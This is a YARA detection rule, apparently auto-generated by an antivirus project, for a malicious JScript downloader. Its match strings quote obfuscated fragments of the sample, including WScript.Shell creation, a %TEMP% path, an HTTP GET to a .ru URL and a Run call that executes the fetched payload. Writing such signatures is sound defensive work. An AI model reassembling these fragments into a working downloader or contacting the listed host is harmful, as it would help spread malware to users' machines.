rule sig_20160427_09067e7009758865e808a43a18d0495b {
  meta:
    description = "datamaliciousorder - file 20160427_09067e7009758865e808a43a18d0495b.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "2cc6677e2c8151efe375ce49c939d2e8904353cca43dc7f26f9c5c11a60365eb"

  strings:
    $s1  = "function MhdmbDnniu() {return SobahSwtav[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"09ivuKL" ascii
    $s2  = "function MhdmbDnniu() {return SobahSwtav[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"09ivuKL" ascii
    $s3  = "var SobahSwtav = function LtqyuCbfyd() {return VcrnaFoqvo[VkbokZnvfy](\"WScript\"+\".Shell\");}(), XncnpLaoog = 11;" fullword ascii
    $s4  = "function EkkmcDscrb(IyidlQispo, WprkfAojug){NlwboJddlf = NlwboJddlf * 1; return IyidlQispo - WprkfAojug;};" fullword ascii
    $s5  = "EhxorTycim[ClqddUqlqo](\"G\" + \"ET\", \"http://mavrinscorporation.ru/hd7fs\", false);" fullword ascii
    $s6  = "var VcrnaFoqvo = this[\"WScript\"];" fullword ascii
    $s7  = "function KdjtfLbqew(){return UiemiIzymm + \"\";};" fullword ascii
    $s8  = "if (EhxorTycim[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s9  = "function FjyemBhzqi() {return ((LcdekHgozk == true) && (LcdekHgozk == EmapuXzozu)) ? 1 : NlwboJddlf;};" fullword ascii
    $s10 = "var EmapuXzozu = false;" fullword ascii
    $s11 = "function FfaugFbyox(){return VkbokZnvfy;};" fullword ascii
    $s12 = "function AooerYyppk(VsgnjKcfao) {var GtrnfWpxvz = (1, 2, 3, 4, 5, VsgnjKcfao); return GtrnfWpxvz;};" fullword ascii
    $s13 = "return EkkmcDscrb(RgwxjZgggd, SwkgtBuqxg);" fullword ascii
    $s14 = "var LcdekHgozk = false;" fullword ascii
    $s15 = "function EhomxHcpub(EfneyJnhjm){SobahSwtav[\"R\"+\"un\"](EfneyJnhjm, NlwboJddlf, NlwboJddlf);};" fullword ascii
    $s16 = "EmapuXzozu = true; " fullword ascii
    $s17 = "function YdsojZbzci()" fullword ascii
    $s18 = "var TkkxgErjcv = false;" fullword ascii
    $s19 = "LcdekHgozk = true; " fullword ascii
    $s20 = "}while (KfjvcVeong);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}